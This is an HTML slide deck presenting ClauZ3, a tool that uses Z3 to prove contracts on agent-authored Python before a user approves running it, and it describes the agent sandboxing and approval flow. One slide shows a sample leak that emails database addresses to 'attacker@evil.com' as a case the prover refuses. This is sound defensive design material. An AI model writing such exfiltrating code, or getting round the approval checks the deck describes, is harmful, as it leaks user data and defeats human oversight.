@@ -1,0 +1,749 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>ClauZ3 — static contracts for agent-authored Python</title>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/reset.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/reveal.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/theme/white.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/atom-one-dark.min.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --accent: #3f51b5;
+      --accent-soft: #e8eaf6;
+      --ink: #1f2030;
+      --muted: #5f6273;
+      --line: #d8dae6;
+      --code-bg: #1c1f2b;
+      --warn: #c0392b;
+      --ok: #1e7f3a;
+    }
+
+    .reveal {
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
+      font-weight: 400;
+      color: var(--ink);
+    }
+
+    .reveal h1,
+    .reveal h2,
+    .reveal h3 {
+      font-family: 'Inter', system-ui, sans-serif;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+      text-transform: none;
+      color: var(--ink);
+    }
+
+    .reveal h1 { font-size: 2.2em; }
+    .reveal h2 { font-size: 1.6em; margin-bottom: 0.6em; }
+    .reveal h3 { font-size: 1.15em; color: var(--accent); margin-bottom: 0.4em; }
+
+    .reveal p, .reveal li { line-height: 1.5; }
+
+    .reveal .slide-number {
+      color: var(--muted);
+      background: transparent;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+    }
+
+    .reveal section { text-align: left; }
+    .reveal section.center { text-align: center; }
+
+    /* Title slide */
+    .title-slide { text-align: center; }
+    .title-slide h1 {
+      font-size: 3em;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.1em;
+    }
+    .title-slide .subtitle {
+      font-size: 1.3em;
+      color: var(--muted);
+      margin-bottom: 1.5em;
+    }
+    .title-slide .footer {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.6em;
+      color: var(--muted);
+      margin-top: 2em;
+    }
+
+    /* Section divider slide */
+    .section-divider {
+      text-align: center;
+    }
+    .section-divider .label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7em;
+      letter-spacing: 0.2em;
+      color: var(--accent);
+      text-transform: uppercase;
+    }
+    .section-divider h2 {
+      font-size: 2.4em;
+      margin-top: 0.3em;
+      color: var(--ink);
+    }
+
+    /* Code */
+    .reveal pre {
+      box-shadow: 0 4px 14px rgba(0,0,0,0.08);
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 0.6em 0;
+    }
+    .reveal pre code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.7em;
+      padding: 0.9em 1.1em;
+      line-height: 1.45;
+      max-height: 480px;
+    }
+    .reveal code {
+      font-family: 'JetBrains Mono', monospace;
+      background: var(--accent-soft);
+      color: var(--ink);
+      padding: 0.05em 0.35em;
+      border-radius: 4px;
+      font-size: 0.85em;
+    }
+    .reveal pre code:not(.hljs) {
+      background: var(--code-bg);
+      color: #ddd;
+    }
+
+    /* Two-column layout */
+    .cols {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5em;
+      align-items: start;
+    }
+
+    /* Verdict badges */
+    .verdict {
+      display: inline-block;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 600;
+      font-size: 0.85em;
+      padding: 0.2em 0.6em;
+      border-radius: 6px;
+      margin-right: 0.3em;
+    }
+    .verdict.pass { background: #e6f4ea; color: var(--ok); }
+    .verdict.fail { background: #fce8e6; color: var(--warn); }
+
+    /* Callout blocks */
+    .callout {
+      background: var(--accent-soft);
+      border-left: 4px solid var(--accent);
+      padding: 0.8em 1em;
+      border-radius: 0 8px 8px 0;
+      margin: 0.6em 0;
+      font-size: 0.85em;
+    }
+
+    /* Big quote / question slide */
+    .big-q {
+      font-size: 1.6em;
+      font-weight: 600;
+      line-height: 1.35;
+      color: var(--ink);
+    }
+    .big-q em { color: var(--accent); font-style: normal; }
+
+    /* Lists with extra breathing room */
+    .reveal ul.spaced li { margin-bottom: 0.5em; }
+
+    /* Tables */
+    .reveal table {
+      font-size: 0.7em;
+      width: 100%;
+      border-collapse: collapse;
+    }
+    .reveal table th,
+    .reveal table td {
+      padding: 0.5em 0.8em;
+      border-bottom: 1px solid var(--line);
+      text-align: left;
+      vertical-align: top;
+    }
+    .reveal table th {
+      font-weight: 600;
+      color: var(--muted);
+      font-size: 0.85em;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+
+    /* "Built on" logos */
+    .built-on { display: flex; gap: 2em; justify-content: center; align-items: center; margin-top: 1em; }
+    .built-on img { height: 80px; }
+    .built-on .z3 { border-radius: 12px; }
+
+    /* Progress bar */
+    .reveal .progress { color: var(--accent); }
+
+    /* Controls */
+    .reveal .controls { color: var(--accent); }
+
+    /* Annotation under a code block */
+    .reveal .note {
+      font-size: 0.7em;
+      color: var(--muted);
+      margin-top: 0.4em;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="title-slide center">
+  <h1>ClauZ3</h1>
+  <div class="subtitle">Static contracts for agent-authored Python</div>
+  <p style="color: var(--muted); font-size: 1em; max-width: 30em; margin: 0 auto;">
+    Asking users to consent to <em style="color: var(--accent); font-style: normal;">what an agent promises</em>,
+    not to a 200-line program they didn't read.
+  </p>
+  <div class="footer">github.com/normalform-ai/clauz3</div>
+</section>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="section-divider center">
+  <div class="label">Part 1</div>
+  <h2>The problem</h2>
+</section>
+
+<section>
+  <h2>The agent permission loop today</h2>
+  <p style="margin-bottom: 0.4em;"><strong>User:</strong>
+    <em>“Send a status email to bob@example.com about today's deploy.”</em></p>
+  <p style="margin-bottom: 0.4em;">The agent emits a script, and the IDE asks
+    the user to approve <em>that</em>:</p>
+  <pre><code class="language-python" data-trim>
+import os, smtplib
+from email.message import EmailMessage
+
+def send(addr: str, body: str) -> None:
+    msg = EmailMessage()
+    msg["From"]    = os.environ.get("FROM_ADDR", "ops@example.com")
+    msg["To"]      = addr
+    msg["Subject"] = "Deploy update"
+    msg.set_content(body)
+    with smtplib.SMTP_SSL(os.environ["SMTP_HOST"]) as s:
+        s.login(os.environ["SMTP_USER"], os.environ["SMTP_PASS"])
+        s.send_message(msg)
+
+changes = os.popen("git log --oneline -n 10").read()
+body = f"Deploy notes:\n\n{changes}"
+
+recipients = ["bob@example.com"] + os.environ.get("CC_LIST", "").split(",")
+for r in recipients:
+    if r.strip():
+        send(r.strip(), body)
+  </code></pre>
+  <pre><code class="language-text" data-trim>
+  ┌──────────────────────────────────────────────────────────────────┐
+  │  Tool wants to run the script above.   Allow this? [y/N]         │
+  └──────────────────────────────────────────────────────────────────┘
+
+> User:  y    (eighth prompt this session)
+  </code></pre>
+  <p class="note">
+    The intent — "email Bob about the deploy" — is somewhere in there.
+    So is whatever <code>$CC_LIST</code> resolves to, and whatever
+    <code>git log</code> happens to print today. There is no
+    <em>declarative</em> thing to consent to.
+  </p>
+</section>
+
+<section>
+  <h2>Security fatigue</h2>
+  <ul class="spaced">
+    <li>Dozens of permission prompts per session</li>
+    <li>Each prompt: a few hundred lines of agent-generated code</li>
+    <li>The user is asked to <em>audit</em> what is fundamentally untrustworthy output</li>
+    <li>Most users: <code>y</code> to everything, or <code>--dangerously-skip-permissions</code></li>
+  </ul>
+  <div class="callout">
+    The prompt asks the wrong question. Reviewing the program means reading every
+    branch. No one does that, and the agent's code is the wrong artifact to anchor
+    trust to in the first place.
+  </div>
+</section>
+
+<section class="center">
+  <p class="big-q">
+    Not <em>“approve this 200-line program?”</em><br><br>
+    But: <em>will this email anyone other than Bob?</em>
+  </p>
+</section>
+
+<section>
+  <h2>What users actually want to ask</h2>
+  <ul class="spaced">
+    <li>Will this email anyone other than the address I named?</li>
+    <li>Will this email the same person twice?</li>
+    <li>Will this withdraw more than $5 total?</li>
+    <li>Will this write outside the sandbox?</li>
+    <li>Will this read any file under <code>~/.ssh</code>?</li>
+  </ul>
+  <p class="note">
+    These are <strong>contracts</strong>, not code reviews. They are small,
+    declarative, and checkable.
+  </p>
+</section>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="section-divider center">
+  <div class="label">Part 2</div>
+  <h2>Background</h2>
+</section>
+
+<section>
+  <h2>Z3, in one slide</h2>
+  <p>A constraint solver from Microsoft Research. Answers questions like:</p>
+  <pre><code class="language-text" data-trim>
+  Given:   x > 5    and    x < 3
+  Z3:      unsat — no value of x satisfies both.
+
+  Given:   addr ∈ ["bob@example.com"]
+            and the program calls send_email(addr)
+            with addr = "ann@example.com"
+  Z3:      sat — counterexample: addr = "ann@example.com"
+  </code></pre>
+  <p class="note">
+    You don't write Z3 directly. You compile high-level constraints into it
+    and ask: is there any way for the program to violate them?
+  </p>
+</section>
+
+<section>
+  <h2>deal: Python runtime contracts</h2>
+  <p><code>deal.readthedocs.io</code> — a contract library for Python.</p>
+  <pre><code class="language-python" data-trim>
+import deal
+
+@deal.pre(lambda addr, msg: "@" in addr)
+@deal.has("trusted")
+@deal.post(lambda result: result is None)
+def send_email(addr: str, msg: str) -> None:
+    ...
+  </code></pre>
+  <ul>
+    <li><code>@deal.pre</code> — precondition (checked on call)</li>
+    <li><code>@deal.post</code> — postcondition (checked on return)</li>
+    <li><code>@deal.has(...)</code> — declares a side-effect category</li>
+  </ul>
+</section>
+
+<section>
+  <h2>deal is great. But it runs at runtime.</h2>
+  <div class="cols">
+    <div>
+      <h3>What deal can do</h3>
+      <ul>
+        <li>Catch a bad call when it happens</li>
+        <li>Document intent at the call site</li>
+        <li>Compose with property-based tests</li>
+      </ul>
+    </div>
+    <div>
+      <h3>What deal can't do <em>before</em> running</h3>
+      <ul>
+        <li>Catch the second email when the first already went out</li>
+        <li>Reject a program with a hidden bad branch</li>
+        <li>Give the user a contract to consent to <em>up front</em></li>
+      </ul>
+    </div>
+  </div>
+  <p class="note">We want the same checks, discharged <em>before</em> any effect runs.</p>
+</section>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="section-divider center">
+  <div class="label">Part 3</div>
+  <h2>ClauZ3</h2>
+</section>
+
+<section>
+  <h2>The idea</h2>
+  <p>Read deal's decorators <strong>statically</strong>, before any effect fires.</p>
+  <pre><code class="language-python" data-trim>
+# trusted layer (audited; the assumptions)
+@deal.pre(lambda addr, msg: "@" in addr)
+@deal.has("trusted")
+def send_email(addr: str, msg: str) -> None: ...
+
+
+# agent code (untrusted; the guarantees)
+import clauz3
+from tools.email.trusted import contracts as emails
+
+@clauz3.guarantee(emails.only(["bob@example.com"]))
+def main() -> None:
+    send_email("bob@example.com", "hi")
+  </code></pre>
+  <p class="note">The prover compiles the guarantee into Z3 constraints and asks: any execution that violates it?</p>
+</section>
+
+<section>
+  <h2>Three roles</h2>
+  <table>
+    <thead>
+      <tr><th>Role</th><th>Writes</th><th>Trusted for</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>User</strong></td>
+        <td>nothing</td>
+        <td>the final decision; consents to a contract, never reads or runs code</td>
+      </tr>
+      <tr>
+        <td><strong>Agent</strong></td>
+        <td>an ad-hoc program + <code>@clauz3.guarantee(...)</code> claims</td>
+        <td>nothing — every claim must be proved</td>
+      </tr>
+      <tr>
+        <td><strong>Trusted Layer Engineer</strong></td>
+        <td>the trusted layer: effects + contract vocabulary</td>
+        <td>everything; this is the root of trust</td>
+      </tr>
+    </tbody>
+  </table>
+  <p class="note">Classic assume / guarantee reasoning. The TLE defines the
+    assumptions; the agent states guarantees; the prover does the rest.</p>
+</section>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="section-divider center">
+  <div class="label">Part 4</div>
+  <h2>Walkthrough</h2>
+</section>
+
+<section>
+  <h2>1 · A trusted email layer</h2>
+  <p>The TLE writes this once. The agent and prover both read it.</p>
+  <pre><code class="language-python" data-trim>
+# tools/email/trusted/effects.py
+@deal.pre(lambda addr, msg: "@" in addr, message='addr must contain "@"')
+@deal.has("trusted")
+def send_email(addr: str, msg: str) -> None:
+    ...
+
+# tools/email/trusted/contracts.py
+Email = effect("send_email")
+
+@contract
+def only(addresses: list[str]) -> ContractSpec:
+    return Email.all(lambda e: e.addr in addresses)
+
+@contract
+def unique_recipients() -> ContractSpec:
+    return Email.distinct(lambda e: e.addr)
+  </code></pre>
+</section>
+
+<section>
+  <h2>2 · The agent writes a program</h2>
+  <p>The user types something like:</p>
+  <div class="callout" style="font-style: italic;">"Send a status email to Bob."</div>
+  <p>The agent (an LLM) emits this program. <em>The user does not read it.</em></p>
+  <pre><code class="language-python" data-trim>
+import clauz3
+from tools.email.trusted import contracts as emails
+from tools.email.trusted.effects import send_email
+
+@clauz3.guarantee(emails.only(["bob@example.com"]))
+def main() -> None:
+    send_email("bob@example.com", "Report is ready")
+  </code></pre>
+  <p class="note">
+    The decorator is the agent's <em>claim</em> about what the program will do.
+    The body of <code>main()</code> is what it actually does. The prover's job
+    is to check those agree.
+  </p>
+</section>
+
+<section>
+  <h2>3 · The agent asks the runner, "can I run this?"</h2>
+  <p>The agent cannot import the trusted effect and call it directly. It has
+    one allowed path: pipe the program to <code>clauz3 run</code>.</p>
+  <pre><code class="language-bash" data-trim>
+$ cat plan.py | clauz3 run
+
+  prove        ✓ main: proved! assertion, guarantee
+  submit       → approval-service at 127.0.0.1:8765
+                request_id = clr_ab18711b7319
+  wait         (pending user decision...)
+  </code></pre>
+  <p class="note">
+    The agent's harness allowlists <code>clauz3 *</code> only. Every other
+    side-effect-capable command is denied. The agent <em>cannot</em> bypass the
+    user.
+  </p>
+</section>
+
+<section>
+  <h2>4 · The user sees a contract — not code</h2>
+  <p>The approval service shows up in the user's browser:</p>
+  <pre><code class="language-text" data-trim>
+  ───────────────────────────────────────────────────────────
+   Request   clr_ab18711b7319                    [pending]
+   Target    main                       Coverage  covered
+  ───────────────────────────────────────────────────────────
+
+   Guarantees
+     •  emails.only(['bob@example.com'])
+
+   User decision
+     Pending user decision.
+     [ feedback / reason …………………………………………………………… ]
+     [ Approve ]  [ Reject contract ]  [ Need more info ]  [ Reject ]
+
+   Coverage
+     ✓ email: covered
+
+   ▸ Show source              (collapsed; rarely opened)
+   ▸ Raw record JSON          (collapsed; for the auditor)
+  ───────────────────────────────────────────────────────────
+  </code></pre>
+  <p class="note">
+    The contract is the unit of consent. <em>Show source</em> is right there
+    for the rare audit, but it's not what the user is being asked to authorize.
+  </p>
+</section>
+
+<section>
+  <h2>5 · Approve → the program runs</h2>
+  <p>The user clicks <strong>Approve</strong>. The runner unblocks, receives a
+    receipt, and only now executes <code>main()</code>.</p>
+  <pre><code class="language-bash" data-trim>
+  decision     approved_once
+  receipt      local-clr_ab18711b7319
+
+  execute      ✓ send_email("bob@example.com", "Report is ready")
+  done.
+  </code></pre>
+  <p><span class="verdict pass">PROVED</span> the guarantee held against every
+    branch <em>before</em> the user was asked. The user only had to consent to
+    one declarative claim.</p>
+</section>
+
+<section>
+  <h2>6 · And if the agent gets it wrong</h2>
+  <pre><code class="language-python" data-trim>
+@clauz3.guarantee(emails.only(["bob@example.com"]))
+def main() -> None:
+    send_email("ann@example.com", "Report is ready")
+  </code></pre>
+  <pre><code class="language-bash" data-trim>
+$ cat plan.py | clauz3 run
+
+  prove        ✗ main: failed guarantee
+                counterexample: addr = "ann@example.com"
+  submit       (not submitted)
+  </code></pre>
+  <p><span class="verdict fail">REFUSED</span> The approval service never sees
+    this request. The user is not bothered. <code>send_email</code> is never
+    called.</p>
+  <div class="callout">
+    The agent can lie, hallucinate, or just be wrong. The prover doesn't care
+    about its prose — only whether the constraints hold.
+  </div>
+</section>
+
+<section>
+  <h2>7 · Aggregates: a bank example</h2>
+  <pre><code class="language-python" data-trim>
+@clauz3.guarantee(bank.max_spend(5))
+def main() -> None:
+    withdraw("checking", 2)
+    withdraw("checking", 3)
+  </code></pre>
+  <p><span class="verdict pass">PROVED</span> sum is exactly 5, so <code>sum &le; 5</code> holds.</p>
+  <pre><code class="language-python" data-trim>
+@clauz3.guarantee(bank.max_spend(5))
+def main() -> None:
+    withdraw("checking", 2)
+    withdraw("checking", 4)
+  </code></pre>
+  <p><span class="verdict fail">REFUSED</span> sum is 6.</p>
+</section>
+
+<section>
+  <h2>8 · Loops over typed query rows</h2>
+  <p>The prover unrolls the loop symbolically and binds <code>row.email</code> to a column of a schema.</p>
+  <pre><code class="language-python" data-trim>
+@clauz3.guarantee(emails.addresses_from(UserRow, "email"))
+@clauz3.guarantee(emails.count_at_most(100))
+def main() -> None:
+    for row in db_query("users", where={"consented": True}):
+        send_email(row.email, "Newsletter is out!")
+  </code></pre>
+  <p><span class="verdict pass">PROVED</span> every recipient is symbolically the <code>email</code> column of a <code>UserRow</code>.</p>
+  <pre><code class="language-python" data-trim>
+def main() -> None:
+    for row in db_query("users"):
+        send_email("attacker@evil.com", row.email)   # leak
+  </code></pre>
+  <p><span class="verdict fail">REFUSED</span> recipient is a literal, not a column.</p>
+</section>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="section-divider center">
+  <div class="label">Part 5</div>
+  <h2>The full flow</h2>
+</section>
+
+<section>
+  <h2>From "prove" to consent</h2>
+  <pre><code class="language-text" data-trim>
+                 ┌────────────────────────────────────────┐
+                 │  Agent writes program + guarantees      │
+                 └──────────────────┬─────────────────────┘
+                                    │ clauz3 run
+                                    ▼
+                 ┌────────────────────────────────────────┐
+                 │  Static prover · Z3                     │
+                 │  Discharges every @clauz3.guarantee     │
+                 └──────────────────┬─────────────────────┘
+                                    │ if and only if proved
+                                    ▼
+                 ┌────────────────────────────────────────┐
+                 │  Approval service (user-controlled)     │
+                 │  Shows contracts, not code; records     │
+                 │  decision + receipt                     │
+                 └──────────────────┬─────────────────────┘
+                                    │ if approved
+                                    ▼
+                 ┌────────────────────────────────────────┐
+                 │  Program executes; trusted effects fire │
+                 └────────────────────────────────────────┘
+  </code></pre>
+</section>
+
+<section>
+  <h2>Coverage policies</h2>
+  <p>The TLE declares what an agent <em>should</em> promise about a domain it uses.</p>
+  <pre><code class="language-python" data-trim>
+# tools/email/trusted/policy.py
+required    = []                       # must be present, or proof fails
+recommended = ["only", "unique_recipients"]  # missing → UI badge, not block
+  </code></pre>
+  <p>The approval UI surfaces the gap:</p>
+  <pre><code class="language-text" data-trim>
+  Coverage
+  ── email: recommended_gap
+       missing recommended: unique_recipients
+  </code></pre>
+  <p class="note">Catches "the agent didn't lie, but also didn't promise anything useful."</p>
+</section>
+
+<section>
+  <h2>Runtime fallback is allowed</h2>
+  <p>Static proof is the default, not the only mode.</p>
+  <ul class="spaced">
+    <li>Some tasks are beyond any tractable static subset.</li>
+    <li>An agent can declare <code>emails.no_guarantees()</code> or leave a
+      domain uncovered.</li>
+    <li>If the user accepts <em>that</em> contract, it's a recorded shared decision.</li>
+    <li><strong>deal</strong>'s runtime preconditions still fire at the trusted
+      boundary. Same trusted layer, different posture.</li>
+  </ul>
+  <div class="callout">
+    Static when we can; runtime when the user accepts it.
+    We don't get in the way of that agreement.
+  </div>
+</section>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<section class="section-divider center">
+  <div class="label">Part 6</div>
+  <h2>Where it's going</h2>
+</section>
+
+<section>
+  <h2>What works today</h2>
+  <ul class="spaced">
+    <li><code>clauz3 prove</code> — discharge guarantees on an entry program</li>
+    <li><code>clauz3 run</code> — prove · approve · execute</li>
+    <li><code>clauz3 approval-service</code> — localhost UI, REST endpoints</li>
+    <li><code>clauz3 install</code> — copy a trusted layer into another project</li>
+    <li>Worked examples: <code>email</code>, <code>bank</code>, <code>email-from-db</code></li>
+    <li>Symbolic iteration over typed query rows</li>
+    <li>Coverage policies surfaced in the approval UI</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Roadmap</h2>
+  <ul class="spaced">
+    <li><strong>Richer relation algebra</strong> — Datalog-style rules over
+      effect facts; provenance.</li>
+    <li><strong>Receipt enforcement inside trusted functions</strong> — trusted
+      effects check the approval receipt at call time.</li>
+    <li><strong>OWL / DL mapping</strong> — contracts as a description-logic
+      vocabulary for cross-tool reuse.</li>
+    <li><strong>Hardened sandbox for <code>clauz3 run</code></strong> — beyond
+      the current import-restricted runner.</li>
+    <li><strong>More trusted layers</strong> — filesystem, HTTP, shell,
+      databases, beyond email and bank.</li>
+    <li><strong>Deterministic natural-language renderings</strong> of contracts
+      for non-technical reviewers.</li>
+  </ul>
+</section>
+
+<section class="center">
+  <h2 style="margin-bottom: 0.4em;">Built on</h2>
+  <div class="built-on">
+    <a href="https://deal.readthedocs.io/">
+      <img src="https://raw.githubusercontent.com/life4/deal/master/logo.png" alt="deal">
+    </a>
+    <a href="https://github.com/Z3Prover/z3">
+      <img class="z3" src="https://github.com/Z3Prover.png" alt="Z3">
+    </a>
+  </div>
+  <p style="margin-top: 1.2em; color: var(--muted); font-size: 0.85em;">
+    Layering on these projects, not replacing them.
+  </p>
+</section>
+
+<section class="title-slide center">
+  <h1 style="font-size: 2.4em;">Try it</h1>
+  <div class="subtitle"><code>github.com/normalform-ai/clauz3</code></div>
+  <p style="color: var(--muted);">Questions?</p>
+</section>
+
+</div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/reveal.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/plugin/highlight/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.1.0/plugin/notes/notes.min.js"></script>
+<script>
+  Reveal.initialize({
+    hash: true,
+    slideNumber: 'c/t',
+    transition: 'fade',
+    transitionSpeed: 'fast',
+    progress: true,
+    width: 1280,
+    height: 800,
+    margin: 0.08,
+    plugins: [ RevealHighlight, RevealNotes ],
+  });
+</script>
+</body>
+</html>
